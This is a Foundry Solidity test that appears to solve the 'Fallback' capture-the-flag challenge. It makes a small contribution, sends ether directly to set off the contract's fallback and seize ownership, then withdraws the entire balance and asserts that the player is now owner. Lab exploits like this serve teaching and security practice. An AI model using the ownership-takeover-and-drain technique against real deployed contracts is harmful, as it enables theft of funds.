// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/1-Fallback.sol";

contract FallbackTest is Test {
    Fallback public target;
    address player = vm.addr(1);

    function setUp() public {
        target = new Fallback();
        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
        vm.deal(player, 10 ether);
    }

    function testFallback() public {
        vm.startPrank(address(player));

        target.contribute{value: 1}();
        payable(address(target)).call{value: 1}("");
        target.withdraw();

        assertTrue(target.owner() == player);
        assertTrue(address(target).balance == 0);
    }
}
